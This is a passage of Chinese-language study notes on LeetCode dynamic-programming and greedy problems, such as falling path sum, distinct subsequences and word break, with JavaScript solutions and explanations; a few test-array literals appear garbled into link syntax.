一模一样，除了`擦边`也会爆炸之外，如下图所示：\n\n![image.png|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/3d002efc335db040d469797519f648c0.png)\n\n\n![image.png|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/a7f8849be07e5398e0052c023da7bb97.png)\n\n下面是代码：\n\n```javascript\nvar findMinArrowShots = function(points) {\n    if (!points.length) return 0\n    points.sort((a, b) => {\n        return a[1] - b[1]\n    })\n    let count = 1;\n    let x = points[0][1];\n    for (let i = 1; i < points.length; i++) {\n        // :::: 不相交\n        if (points[i][0] > x) {\n            x = points[i][1]\n            count += 1\n        }\n    }\n    return count\n};\n```\n\n或者也行：\n\n> [!question]\n> 请思考，上面的不相交判断，为什么不需要`|| x > points[i][1]` 也行？\n\n\n```javascript\nvar findMinArrowShots = function(points) {\n    if (!points.length) return 0\n    points.sort((a, b) => {\n        return a[1] - b[1]\n    })\n    let count = 1;\n    let x = points[0][1];\n    for (let i = 1; i < points.length; i++) {\n        // :::: 不相交\n        if (points[i][0] > x || x > points[i][1]) {\n            x = points[i][1]\n            count += 1\n        }\n    }\n    return count\n};\n\n```\n\n## 第 3 题：跳跃游戏 I \n\nhttps://leetcode.cn/problems/jump-game/\n\n## 第 4 题：跳跃游戏 II\n\nhttps://leetcode.cn/problems/jump-game-ii/\n\n\n\n\n\n\n\n\n\n\n","8YNZusNv":"\n# base case 和备忘录的初始值怎么定（下降路径的最小和）\n\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题解 \n\n- https://leetcode.cn/problems/minimum-falling-path-sum/\n\n简单说就是，输入为一个 `n * n` 的二维数组 `matrix`，请你计算从`第一行`落到`最后一行`，经过的`路径和最小`为多少，如下图：\n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/7fbfb0c72dfb093f3c028ac1d41924d2.png)\n\n## 2. dp 函数定义\n\n- 从第一行`matrix[0][?]`向下落，落到位置 `matrix[i][j]` 的最`小路径和`为 `dp(matrix, i, j)`\n- 每次下降，可以`向下`、`向左下`、`向右下`三个方向移动一格。\n\t- 也就是说，可以从 `matrix[i][j]` 降到 `matrix[i+1][j]` 或 `matrix[i+1][j-1]` 或 `matrix[i+1][j+1]` 三个位置。\n\t- 如下图：`橘色的格子`只能从`三个蓝色的格子` 转移而来。如下图：\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/736082a26402922ebd21bf34f8136d34.png)\n\n所以，只要知道到达 `dp(i-1, j)`, `dp(i-1, j-1)`, `dp(i-1, j+1)` 这三个位置的`最小路径和`，加上 `matrix[i][j]` 的值，就能够计算出来到达`位置 (i, j)` 的最小路径和：\n\n## 3. 自顶向下的递归解法 - 暴力\n\n> [!info]\n> 1、以下解法，LeetCode 会超时\n> \n> 2、注意下面的所有注释，记录得很详细了\n\n```javascript\nlet minFallingPathSum = function (matrix) {\n    let n = matrix.length;\n    let res = Number.MAX_VALUE;\n    // 终点可能在最后一行的任意一列\n    for (let j = 0; j < n; j++) {\n        // n-1 即最后一行，j 即最后一行的任意一列\n        // 所以，只要【遍历】找出落到最后一行的最小路径和，就是最终结果\n        res = Math.min(res, dp(matrix, n - 1, j));\n    }\n    return res;\n};\n\n// 从第一行 matrix[0][?]  向下落，\n// 落到位置 matrix[i][j] 的最小路径和为 dp(matrix, i, j)\nfunction dp(matrix, i, j) {\n    // ::::非法索引，返回特殊值\n    if (i < 0 || i >= matrix.length || j < 0 || j >= matrix.length) {\n        return 99999;\n    }\n    // ::::base case 递归结束条件, 落到第一行的任意一列，返回该列的值\n    // base: 倒着遍历的，i=0 意味着遍历结束了，触发  base case了\n    if (i === 0) return matrix[i][j];\n\n    // ::::状态转移方程\n    // ::::从 matrix[i][j] 由三个值转移而来，\n    //  即 matrix[i-1][j]、matrix[i-1][j-1]、matrix[i-1][j+1] 三个位置\n    // :::: 注意：都是 i-1，即上一行, j-1、j, j+1 为上一行的左、中、右三个位置\n    return matrix[i][j] + Math.min(\n        dp(matrix, i - 1, j),\n        dp(matrix, i - 1, j - 1),\n        dp(matrix, i - 1, j + 1)\n    )\n}\n\nconst matrix1 = [2, 1, 3], [6, 5, 4], [7, 8, 9](/post/8YNZusNv.html#2,-1,-3],-[6,-5,-4],-[7,-8,-9);\nconst matrix2 = [-19, 57], [-40, -5](/post/8YNZusNv.html#-19,-57],-[-40,--5);\n\nconsole.log(minFallingPathSum(matrix1)); // 13\nconsole.log(minFallingPathSum(matrix2)); // -59\n\n```\n\n### 3.1. 问：为什么要处理`非法索引`，以及返回`特殊值`为什么是 `99999` ？ \n\n首先，递归过程中， `i-1`  `j-1`  `j+1` 这三种运算可能会导致越界，所以需要特殊处理\n\n至于，为什么是 `99999` ，看题目，如下图：\n\n![image.png|496](https://832-1310531898.cos.ap-beijing.myqcloud.com/a38cfd9dd07105d8cc22998e1ccd9397.png)\n\n所以，合法答案的区间是 `[-10000, 10000]`，`特殊值`只要保证是一个`永远不会被取到的最大值`即可（因为递归的过程中，会重复比较最小值），所以这里使用 `> 10001 的任意值`都行，当然也包括 `99999` \n\n### 3.2. base case 中，为什么是 `i===0` ?\n\n`dp函数`定义所决定的，即 从`第一行`下落的任意位置下落到位置 `matrix[i][j]` 的最小路径和为 `dp(matrix, i, j)`\n\n所以，`i === 0` \n\n## 4. 自顶向下的递归解法 - 备忘录优化\n\n代码如下：\n\n```javascript hl:29,25\n/**\n * @param {number[][]} matrix\n * @return {number}\n */\nlet minFallingPathSum = function (matrix) {\n    let n = matrix.length;\n    let res = Number.MAX_VALUE;\n    // ::::add 初始化备忘录\n    let memo = new Array(n).fill([]);\n    for (let i = 0; i < n; i++) {\n        memo[i] = new Array(n).fill(66666);\n    }\n    // 终点可能在最后一行的任意一列\n    for (let j = 0; j < n; j++) {\n        // ::::n-1 即最后一行，j 即最后一行的任意一列\n        // ::::所以，只要【遍历】找出落到最后一行的最小路径和，就是最终结果\n        res = Math.min(res, dp(matrix, n - 1, j, memo));\n    }\n    return res;\n};\n\n// 从第一行 matrix[0][?]  向下落，落到位置 matrix[i][j] 的最小路径和为 dp(matrix, i, j)\nfunction dp(matrix, i, j, memo) {\n    // ::::1、非法索引，返回特殊值\n    if (i < 0 || i >= matrix.length || j < 0 || j >= matrix.length) {\n        return 99999;\n    }\n    // 2、base case 递归结束条件, 落到第一行的任意一列，返回该列的值\n    // i = 0 代表落到第一列，是倒着遍历的，所以是  base case 了\n    if (i === 0) return memo[i][j] = matrix[i][j];\n    // ::::3、备忘录\n    if (memo[i][j] !== 66666) return memo[i][j];\n    // ::::状态转移方程\n    // ::::从 matrix[i][j] 由三个值转移而来，\n    //  即 matrix[i-1][j]、matrix[i-1][j-1]、matrix[i-1][j+1] 三个位置\n    // :::: 注意：都是 i-1，即上一行, j-1、j, j+1 为上一行的左、中、右三个位置\n    return memo[i][j] = matrix[i][j] + Math.min(\n        dp(matrix, i - 1, j, memo),\n        dp(matrix, i - 1, j - 1, memo),\n        dp(matrix, i - 1, j + 1, memo)\n    )\n}\n\nconst matrix1 = [2, 1, 3], [6, 5, 4], [7, 8, 9](/post/8YNZusNv.html#2,-1,-3],-[6,-5,-4],-[7,-8,-9);\nconst matrix2 = [-19, 57], [-40, -5](/post/8YNZusNv.html#-19,-57],-[-40,--5);\n\nconsole.log(minFallingPathSum(matrix1)); // 13\nconsole.log(minFallingPathSum(matrix2)); // -59\n\n```\n\n### 4.1. 如何初始化一个`二维数组`，竟然搞不会了？\n\n，假如设置一个 `m*n` 的二维数组\n- 第一、设置`行`，初始化元素为空数组 `new Array(m).fill([])`\n- 第二，设置`列`，根据列 `m` 遍历，设置每个元素的值为 `new Array(n).fill(666)`\n\n```javascript\nlet m = 3;\nlet n = 4;\n\n// :::: 首次，new Array(m).fill([])\nlet memo = new Array(m).fill([]);\n\n// :::: 其次: 根据 n 遍历，并 fill(666)\nfor (let i = 0; i < m; i++) {\n    memo[i] = new Array(n).fill(666);\n}\nconsole.log(memo);\n\n// 输出如下，3 行 4 列\n[\n  [ 666, 666, 666, 666 ],\n  [ 666, 666, 666, 666 ],\n  [ 666, 666, 666, 666 ]\n] \n\n```\n\n> [!danger]\n> 注意：每次都使用 `行数 m` 来遍历，最后才会使用 `列数 n`\n\n### 4.2. 为什么 `memo` 的初始化值为 `66666` ？ \n\n同样，这个==问题==的 合法区域是 `[-10000, 10000]` ，所以，初始化值只要`避开这个区间`即可，当然，`66666` 就是在这个`区间外` \n\n## 5. 自低向上的 `dp数组` 解法\n\n> 待补充！\n\n## 6. 参考\n\n- https://labuladong.github.io/algo/di-er-zhan-a01c6/dong-tai-g-a223e/basecase-h-de925/\n- https://leetcode.cn/problems/minimum-falling-path-sum/","BtvUiBr5":"\n# 最优子结构原理 和 DP 数组遍历方向\n\n\n`#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 如何判断是否复合 `最优子结构` \n\n- 找`全校最高分`， ==>  那么`每个班的最高分`，这是复合`最优子结构`的\n- 找`全校最大分差`，并不能通过找`每个班最大分差`来实现，这`不符合最优子结构`\n\t- 最优子结构失效情况 => **改造问题** ，即找出全校最高分 和 最低分 ，不就可以`转化为第一个问题吗？`\n\n\n>  一棵二叉树的最大值，通过分解为求`左右子树（子问题`）的最大值，所以也是`符合最优子结构`的，但是它不是动态规划问题。 `最优子结构`是动态规划的`必要条件`，即动态规划一定是`有最优子结构`的，一定是让你`求最值`的。 \n\n\n## 如何判断是否有`重叠子问题`\n\n1、画图，递归图，看看有没有`重复节点`，如 `fib` 问题，如下图：\n\n![|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/37c23ab67a80007f1861229e24b2bf8d.png)\n\n2、通过`递归框架`判断，比如`状态 (i, j)` 转移到 `(i-1, j-1)` ，有`几种路径`？\n\n- `状态 (i, j)` → `dp(i - 1, j)` → `dp(i - 1, j - 1)`\n-  `状态 (i, j)` → `dp(i, j - 1)` → `dp(i - 1, j - 1)`\n\n![|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/c7281993ba6194128ae2e841e3711650.png)\n\n所以 `dp(i-1, j-1)` 会被多次计算，一定存在 `重叠子问题`，可以通过 `「备忘录」`或者`「DP table」` 来优化。\n\n\n## 为什么经常看到将 `dp 数组`的大小设置为 `n + 1` 而不是 `n` ?\n\n- 其实 `dp数组`大小设置多大，**取决于是否能够正确处理 base case** ,  \n- 另外，其实设置大一点也是可以的。\n\n## 为什么动态规划遍历 `dp 数组`的方式五花八门，有的`正着遍历`，有的`倒着遍历`，有的`斜着遍历`。\n\n其实只需要关注`两点`：\n\n1、`遍历的过程中`，所需的状态必须是已经计算出来的。\n2、`遍历结束后`，存储结果的那个位置必须已经被计算出来。\n\n比如还是  [10. 子序列：最小编辑距离](/post/nYmTR3Gq.html) 的示例，`dp[m][n]` 结果是通过 `dp[i-1][j]`, `dp[i][j-1],` `dp[i-1][j-1]` 转移而来，所以肯定是`正着遍历` ，如下图：\n\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/b67cadcca89e5d789190d70ab50298d0.png)\n\n\n\n\n## 参考\n\n- [https://labuladong.github.io/algo/di-er-zhan-a01c6/dong-tai-g-a223e/zui-you-zi-fbef6/](https://labuladong.github.io/algo/di-er-zhan-a01c6/dong-tai-g-a223e/zui-you-zi-fbef6/)\n","d7me4IEs":"\n# 动态规划穷举的两种视角：不同的子序列个数\n\n\n`#算法/动态规划`\n\n\n| LeetCode                                                                           | 力扣                                                                 | 难度  |\n| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------ | --- |\n| [115. Distinct Subsequences](https://leetcode.com/problems/distinct-subsequences/) | [115. 不同的子序列](https://leetcode.cn/problems/distinct-subsequences/) | 🔴  |\n\n\n## 目录\n<!-- toc -->\n ## 1. 先回顾下动态规划的解题要点 \n\n- 明确 `dp 函数或数组`的定义，从`已知的「状态」`中`推导`出`未知的「状态」`\n- 就算 `dp 函数/数组`的定义相同，如果你使用`不同的「视角」`进行穷举，效率也不见得是相同的\n\t- 见本文\n\n## 2. 两种穷举的思路（排列组合的两个视角）\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/1b0252f2059f869dc667fb00931a7571.png)\n\n### 2.1. 球盒模型\n\n如下图：\n\n![|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/7936c202a574509aca13dd0c848ab576.png)\n\n### 2.2. 视角 1： 盒子的视觉\n\n选择：\n- 选择哪个盒子\n\t- 选择之后不能再被选择\n\n![|672](https://832-1310531898.cos.ap-beijing.myqcloud.com/45fc7d6729e977ba87c2128b01fd9543.png)\n\n> 一直推导，最终结论，如上面的公式\n\n### 2.3. 视角 2：球的视角\n\n选择：\n- 放入\n- 不放入\n\n![|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/0e5325aa3c46b849764ed679c9f13d00.png)\n\n## 3. 该题分析\n\n![|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/a8bac35da79575b04fc5d3cad04ef71f.png)\n\n> 注意是 `子序列`\n\n### 暴力解法\n\n一个思路是： `s` 的`子序列`中有多少个 `t` , 所以找出所有的`子序列`即可，这是一个暴力解法\n\n### 拆解问题\n\n所以，考虑是否能够拆解成 `规模更小的子问题` ，所以，**更小的子问题是**？\n\n`s[i..]` 的`子序列`中 `t[j..]` 出现的次数为 `dp(s, i, t, j)`\n\n所以，`原题`想要的结果是 `dp(s, 0, t, 0)` ，可写如下代码：\n\n![|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/7af5e2cc42c33fc1c5b453c3c3ed63c3.png)\n\n> 子序列是需要保证顺序的，所以是 `s[i...]` 或者 `t[j...]`\n\n参考上面，请问：**盒子多还是小球多？**\n- `t` 代表`盒子`\n- `s` 代表 `小球`\n\n所以，要做的事情就是把`所有盒子都装上一个小球`\n\n## 4. 盒子的视角 ， 即 `t 的视角`\n\n`dp(s, 0, t, 0)` 如何`转移`呢？ \n- 以 `s = \"babgbag\", t = \"bag\"` 为例：\n\t- `t[0]` 在 `s` 中的什么位置 ？\n\t\t- `s[0]` 和 `s[2]` 及 `s[4]`\n\t\t- 所以 `转化为：`  `s[0...] , s[2...] , s[4...]`  中出现 `t[1...]` 的个数\n\n上面的描述`翻译`成代码如下：\n\n![|416](https://832-1310531898.cos.ap-beijing.myqcloud.com/43ae65d42c0ca29aaf7d83a08fdb7a15.png)\n\n### 4.1. 最终可执行代码\n\n```javascript\n/**\n * @param {string} s\n * @param {string} t\n * @return {number}\n */\nvar numDistinct = function(s, t) {\n    // ::::dp(s, i, t, j) 表示 s[i..] 中 t[j..] 出现的个数\n    return dp(s, 0, t, 0);\n};\nfunction dp(s,i,t,j) {\n    //// :::: base case 1\n    if (j === t.length) {\n        // t 已经全部匹配完成\n        return 1;\n    }\n    // :::: base case 2\n    if (s.length - i < t.length - j) {\n        // s[i..] 比 t[j..] 还短，必然没有匹配的子序列\n        return 0;\n    }\n    // ::::代表出现的次数\n    let res = 0;\n    // :::: 在 s[i..] 中寻找 k，使得 s[k] == t[j]\n    for (let k = i; k < s.length; k++) {\n        if (s[k] === t[j]) {\n            // 累加结果\n            res += dp(s, k + 1, t, j + 1);\n        }\n    }\n    return res;\n}\n\nconsole.log(numDistinct('rabbbit', 'rabbit')); // 3\nconsole.log(numDistinct('babgbag', 'bag'));    // 5\n```\n\n### 4.2. 备忘录优化\n\n```javascript\n/**\n * @param {string} s\n * @param {string} t\n * @return {number}\n */\nvar numDistinct = function(s, t) {\n    // ::::add memo\n    const memo = new Array(s.length).fill([]);\n    for (let i = 0; i < s.length; i++) {\n        // :::: 为什么是 -1 ？？？因为储存的值是 出现次数\n        memo[i] = new Array(t.length).fill(-1);\n    }\n    return dp(s, 0, t, 0,memo);\n};\nfunction dp(s,i,t,j,memo) {\n    if (j === t.length) {\n        return 1;\n    }\n    if (s.length - i < t.length - j) {\n        return 0;\n    }\n    // :::: 查备忘录防止冗余计算\n    if (memo[i][j] !== -1) {\n        return memo[i][j];\n    }\n    let res = 0;\n    for (let k = i; k < s.length; k++) {\n        if (s[k] === t[j]) {\n            // 累加结果\n            res += dp(s, k + 1, t, j + 1,memo);\n        }\n    }\n    memo[i][j] = res;\n    return res;\n}\n\nconsole.log(numDistinct('rabbbit', 'rabbit'));// 3\nconsole.log(numDistinct('babgbag', 'bag')); // 5\n```\n\n## 5. 算法复杂度分析\n\n- 带备忘录的动态规划算法的时间复杂度\n\n   - = `子问题的个数`  *  `函数本身的时间复杂度`\n   - = `「状态」的个数`  * `函数本身的时间复杂度`\n   - = `O(MN) * O(M)`\n   - = `O(N * M^2)`\n\n> `M, N` 分别代表 `s, t` 的长度，算法的`「状态」`就是 `dp 函数`参数 `i, j 的组合`\n\n## 6. 小球的视角 即 `s 的视角`\n\n原问题是计算 `s[0..]` 的所有子序列中 `t[0..]` 出现的次数\n\n- `s[0] = t[0]，即能够匹配`， 又有`两种情况`\n\t- 情况 1：去匹配：`=>`    `s[1..]` 的所有`子序列`中计算 `t[1..]` 出现的次数\n\t- 情况 2：不匹配：`=>`   `s[1..]` 的所有`子序列`中计算 `t[0..]` 出现的次数\n- `s[0] != t[0]` 在 `s[1..]` 的`子序列`中计算 `t[0...]` 的出现次数\n\n翻译成代码，即：\n\n```javascript\n/**\n *   // ::::转态转移方程定义：\n *    s[i..] 的子序列中 t[j..] 出现的次数为 dp(s, i, t, j)\n */\nvar dp = function(s, i, t, j){\n    if(s[i] === t[j]){\n        // 匹配，两种情况，累加关系\n        // 1、去匹配 j+1  \n        // 2、不去匹配 j\n        return dp(s, i + 1, t, j + 1) + dp(s, i + 1, t, j);\n    } else {\n        // 不匹配，在 s[i+1..] 的子序列中计算 t[j..] 的出现次数\n        return dp(s, i + 1, t, j);\n    }\n}\n```\n\n> 为啥明明 `s[0]` 可以匹配 `t[0]`，还不让它俩匹配呢？主要是为了给 `s[0]` 之后的元素匹配的机会\n\n### 6.1. 带备忘录的解法\n\n```javascript\n/**\n * @param {string} s\n * @param {string} t\n * @return {number}\n */\nvar numDistinct = function(s, t) {\n    const memo = new Array(s.length).fill([]);\n    for (let i = 0; i < s.length; i++) {\n        memo[i] = new Array(t.length).fill(-1);\n    }\n    return dp(s, 0, t, 0, memo);\n};\n\n// 定义：s[i..] 的子序列中 t[j..] 出现的次数为 dp(s, i, t, j, memo)\nvar dp = function(s, i, t, j, memo) {\n    // base case 1\n    if (j === t.length) {\n        return 1;\n    }\n    // base case 2\n    if (s.length - i < t.length - j) {\n        return 0;\n    }\n    // 查备忘录防止冗余计算\n    if (memo[i][j] !== -1) {\n        return memo[i][j];\n    }\n    let res = 0;\n    // 执行状态转移方程\n    if (s[i] === t[j]) {\n        // 匹配，两种情况，累加关系\n        res += dp(s, i + 1, t, j + 1, memo) + dp(s, i + 1, t, j, memo);\n    } else {\n        // 不匹配，在 s[i+1..] 的子序列中计算 t[j..] 的出现次数\n        res += dp(s, i + 1, t, j, memo);\n    }\n    // 结果存入备忘录\n    memo[i][j] = res;\n    return res;\n};\n\nconsole.log(numDistinct('rabbbit', 'rabbit'));// 3\nconsole.log(numDistinct('babgbag', 'bag')); // 5\n```\n\n### 6.2. 复杂度分析\n\n- 带备忘录的动态规划算法的时间复杂度\n\n   - = `子问题的个数`  *  `函数本身的时间复杂度`\n   - = `「状态」的个数`  * `函数本身的时间复杂度`\n   - = `O(MN) * O(1)`\n   - = `O(N * M)`\n\n> `M, N` 分别代表 `s, t` 的长度，算法的`「状态」`就是 `dp 函数`参数 `i, j 的组合`\n\n明显比性能更好\n\n## 7. 总结\n\n就算 `dp 函数/数组`的定义相同，如果你使用不同的`「视角」`进行穷举，效率也不见得是相同的\n\n## 8. 思考\n\n那么不妨进一步思考一下，什么样的动态规划题目可能产生「穷举视角」上的差异？换句话说，什么样的动态规划问题能够抽象成经典的「球盒模型」呢？\n\n## 9. 参考\n\n- [https://labuladong.github.io/algo/di-er-zhan-a01c6/dong-tai-g-a223e/dong-tai-g-2526f/](https://labuladong.github.io/algo/di-er-zhan-a01c6/dong-tai-g-a223e/dong-tai-g-2526f/)\n- [https://leetcode.cn/problems/distinct-subsequences/](https://leetcode.cn/problems/distinct-subsequences/)\n","oweVYdpb":"\n# 动态规划和回溯算法的思维转换（单词拆分）\n\n`#算法/动态规划`  `#回溯算法` \n\n\n| LeetCode                                                           | 力扣                                                          | 难度  |\n| ------------------------------------------------------------------ | ----------------------------------------------------------- | --- |\n| [140. Word Break II](https://leetcode.com/problems/word-break-ii/) | [140. 单词拆分 II](https://leetcode.cn/problems/word-break-ii/) | 🔴  |\n| [139. Word Break](https://leetcode.com/problems/word-break/)       | [139. 单词拆分](https://leetcode.cn/problems/word-break/)       | 🟠  |\n\n## 目录\n<!-- toc -->\n ## 1. 单词拆分 \n\n![图片&文件](./files/20241111-4.png)\n\n### 1.1. 回溯算法思路\n\n```javascript hl:8,28,32\nvar wordBreak = function (s, wordDict) {\n  let found = false;\n  // 记录搜索过程中的路径\n  let track = [];\n\n  // 参数 s 表示当前搜索到的字符串\n  // 参数 i 表示当前搜索到 s 中的第 i 个字符\n  // 递归函数的定义：对于 s[i..] 这个后缀字符串，从 s[i] 开始搜索 wordDict\n  function backtrack(s, i) {\n    // base case\n    if (found) {\n      // 如果已经找到答案，就不要再递归搜索了\n      return;\n    }\n    if (i == s.length) {\n      // 整个 s 都被匹配完成，找到一个合法答案\n      found = true;\n      return;\n    }\n    // 回溯算法框架\n    for (let word of wordDict) {\n      // 看看哪个单词能够匹配 s[i..] 的前缀\n      let len = word.length;\n      // 代表从 i 开始的一个单词，长度为 len，看看是不是等于 word\n      let newWord = s.substring(i, i + len);\n      if (i + len <= s.length && newWord == word) {\n        // 找到一个单词匹配 s[i..i+len)\n        // 做选择\n        track.push(word);\n        // 进入回溯树的下一层，继续匹配 s[i+len..]\n        backtrack(s, i + len);\n        // 撤销选择\n        track.pop();\n      }\n    }\n  }\n\n  backtrack(s, 0);\n  return found;\n};\n```\n\n这段代码无法通过所有测试用例\n\n### 1.2. 利用后续位置优化：剪枝\n\n```javascript hl:6,27,26,48\nvar wordBreak = function (s, wordDict) {\n  let found = false;\n  // 记录搜索过程中的路径\n  let track = [];\n\n  // 记录不能切分的子串\n  let memo = new Set();\n\n  // 参数 s 表示当前搜索到的字符串\n  // 参数 i 表示当前搜索到 s 中的第 i 个字符\n  // 递归函数的定义：对于 s[i..] 这个后缀字符串，从 s[i] 开始搜索 wordDict\n  function backtrack(s, i) {\n    // base case\n    if (found) {\n      // 如果已经找到答案，就不要再递归搜索了\n      return;\n    }\n    if (i == s.length) {\n      // 整个 s 都被匹配完成，找到一个合法答案\n      found = true;\n      return;\n    }\n\n    // 当前子串（子树）不能被切分，就不用继续递归了\n    // 新增的剪枝逻辑，查询子串（子树）是否已经计算过\n    let suffix = s.substring(i);\n    if (memo.has(suffix)) {\n      // 当前子串（子树）不能被切分，就不用继续递归了\n      return;\n    }\n\n    // 回溯算法框架\n    for (let word of wordDict) {\n      // 看看哪个单词能够匹配 s[i..] 的前缀\n      let len = word.length;\n      // 代表从 i 开始的一个单词，长度为 len，看看是不是等于 word\n      let newWord = s.substring(i, i + len);\n\n      if (i + len <= s.length && newWord == word) {\n        // 找到一个单词匹配 s[i..i+len)\n        // 做选择\n        track.push(word);\n        // 进入回溯树的下一层，继续匹配 s[i+len..]\n        backtrack(s, i + len);\n        // 撤销选择\n        track.pop();\n\n        // 后序位置，将不能切分的子串（子树）记录到备忘录\n        if (!found) {\n          memo.add(suffix);\n        }\n      }\n    }\n  }\n\n  backtrack(s, 0);\n  return found;\n};\n\n```\n\n### 1.3. 转成动态规划问题（分解问题的思路）\n\n> [!danger]\n> 时间关系，知道有这种思路就好了，没太细深究\n\n对于输入的字符串 `s`，如果我能够从单词列表 `wordDict` 中找到一个单词匹配 `s` 的前缀 `s[0..k]`，那么只要我能拼出 `s[k+1..]`，就一定能拼出整个 `s`。\n\n换句话说，我把规模较大的原问题 `wordBreak(s[0..])` 分解成了规模较小的子问题 `wordBreak(s[k+1..])`，然后通过子问题的解反推出原问题的解。\n\n#### 1.3.1. dp 函数定义\n\n```javascript\n// 定义：返回 s[i..] 是否能够被拼出\nfunction dp(s, i) {}\n\n// 计算整个 s 是否能被拼出，调用 dp(s, 0)\n```\n\n#### 1.3.2. 完整代码\n\n```javascript\nvar wordBreak = function(s, wordDict) {\n    // 用哈希集合方便快速判断是否存在\n    let wordSet = new Set(wordDict);\n    // 备忘录，-1 代表未计算，0 代表无法凑出，1 代表可以凑出\n    let memo = Array(s.length).fill(-1);\n\n    // 主函数\n    function dp(i) {\n        // base case\n        if (i == s.length)\n            return true;\n        // 防止冗余计算\n        if (memo[i] !== -1)\n            return memo[i] == 0 ? false : true;\n\n        // 遍历 s[i..] 的所有前缀\n        for (let j = i + 1; j <= s.length; j++) {\n            // 看看哪些前缀存在 wordDict 中\n            let prefix = s.substring(i, j);\n            if (wordSet.has(prefix)) {\n                // 找到一个单词匹配 s[i..j)\n                // 只要 s[j..] 可以被拼出，s[i..] 就能被拼出\n                if (dp(j)) {\n                    memo[i] = 1;\n                    return true;\n                }\n            }\n        }\n\n        // s[i..] 无法被拼出\n        memo[i] = 0;\n        return false;\n    }\n\n    return dp(0);\n};\n```\n\n## 2. 单词拆分 II\n\n![图片&文件](./files/20241111-5.png)\n\n这道题不是单单问你 `s` 是否能被拼出，还要问你是`怎么拼`的\n\n### 2.1. 回溯算法思路（遍历的思路）\n\n基于上面的代码，添加以下行即可\n\n```javascript hl:4,23,12\nvar wordBreak = function (s, wordDict) {\n  // 记录结果\n  let res = [];\n  // 记录回溯算法的路径\n  let track = [];\n\n  // 回溯算法框架\n  function backtrack(i) {\n    // base case\n    if (i === s.length) {\n      // 找到一个合法组合拼出整个 s，转化成字符串\n      res.push(track.join(\" \"));\n      return;\n    }\n\n    // 回溯算法框架\n    for (let word of wordDict) {\n      // 看看哪个单词能够匹配 s[i..] 的前缀\n      let length = word.length;\n      if (i + length <= s.length && s.substring(i, i + length) === word) {\n        // 找到一个单词匹配 s[i..i+len)\n        // 做选择\n        track.push(word);\n        // 进入回溯树的下一层，继续匹配 s[i+len..]\n        backtrack(i + length);\n        // 撤销选择\n        track.pop();\n      }\n    }\n  }\n\n  // 执行回溯算法穷举所有可能的组合\n  backtrack(0);\n  return res;\n};\n```\n\n### 2.2. 不能利用后续位置优化：剪枝\n\n不能使用备忘录优化\n\n因为回溯算法的 `track` 变量仅维护了从根节点到当前节点走过的路径，并没有记录子树的信息。\n\n### 2.3. 但可以使用分解问题（动态规划）可以剪枝\n\n```javascript\nvar wordBreak = function(s, wordDict) {\n    const wordDictSet = new Set(wordDict);\n    // 备忘录\n    const memo = new Map();\n    \n    // 定义：返回用 wordDict 构成 s[i..] 的所有可能\n    const dp = (i) => {\n        const res = [];\n        if (i === s.length) {\n            res.push(\"\");\n            return res;\n        }\n        // 防止冗余计算\n        if (memo.has(i)) {\n            return memo.get(i);\n        }\n        \n        // 遍历 s[i..] 的所有前缀\n        for (let j = i + 1; j <= s.length; j++) {\n            // 看看哪些前缀存在 wordDict 中\n            const prefix = s.slice(i, j);\n            if (wordDictSet.has(prefix)) {\n                // 找到一个单词匹配 s[i..i+len)\n                const suffixList = dp(j);\n                // 构成 s[i+len..] 的所有组合加上 prefix \n                // 就是构成构成 s[i] 的所有组合\n                suffixList.forEach((suffix) => {\n                    const space = suffix === \"\" ? \"\" : \" \";\n                    res.push(prefix + space + suffix);\n                });\n            }\n        }\n        // 存入备忘录\n        memo.set(i, res);\n        \n        return res;\n    };\n    \n    return dp(0);\n};\n```\n\n这个解法依然用`备忘录`消除了`重叠子问题`，所以 `dp` 函数递归调用的次数减少为 O(N)O(N)，但 `dp` 函数本身的时间复杂度上升了，因为 `subProblem` 是一个子集列表，它的长度是指数级的。\n\n再加上拼接字符串的效率并不高，且还要消耗备忘录去存储所有子问题的结果，所以从 Big O 的角度来分析，这个算法的时间复杂度并不比回溯算法低，依然是指数级别；但这个解法确实消除了重叠子问题，所以是要比回溯算法高明一些。\n\n## 3. 最后\n\n- 动态规划的思路也可以去解决回溯算法\n- 我们处理排列组合问题时**一般使用回溯算法去「遍历」回溯树，而不用「分解问题」的思路去处理**，因为存储子问题的结果就需要大量的时间和空间，除非重叠子问题的数量较多的极端情况，否则得不偿失。\n\n","BY4xNX8e":"\n# 对动态规划进行空间压缩\n\n`#算法/动态规划` \n\n能够使用空间压缩技巧的动态规划都是二维 `dp` 问题，\n- 它的状态转移方程，如果计算状态 `dp[i][j]` 需要的都是 `dp[i][j]` **相邻**的状态，那么就可以使用空间压缩技巧，将**二维**的 `dp` 数组转化成**一维**，将空间复杂度从 `O(N^2)` 降低到 `O(N)`。\n\n但使用空间压缩技巧对二维 `dp` 数组进行降维打击之后，解法代码的**可读性变得非常差**了，如果直接看这种解法，任何人都是一脸懵逼的。\n\n算法的优化就是这么一个过程，先写出可读性很好的暴力递归算法，然后尝试运用动态规划技巧优化重叠子问题，最后尝试用空间压缩技巧优化空间复杂度。\n\n更多参考： https://labuladong.online/algo/dynamic-programming/space-optimization/","suOLnYY5":"\n# 前言\n\n\n","eW1K979T":"\n# 排序算法基础\n\n`#算法` `#排序`  \n\n## 目录\n<!-- toc -->\n ## 1. 排序算法的几个重要指标 \n\n- 复杂度\n- 是否是**原地**排序\n- 是否是**稳定**的\n- 是否**自适应**的\n\t- 即能够利用输入数据**已有的顺序信息**来减少计算量\n\n## 2. 利用语言本身的 API 排序\n\n### 2.1. Python 排序方法\n\nPython 提供了两种主要的排序方法：`sort()` 和 `sorted()`。\n\n#### 2.1.1. `sort()` 方法\n\n   - 这是列表（list）对象的一个方法。\n   - 它**会直接修改原列表**，不返回新的对象。\n   - 默认按升序排列。\n\n示例：\n```python\nnumbers = [3, 1, 4, 1, 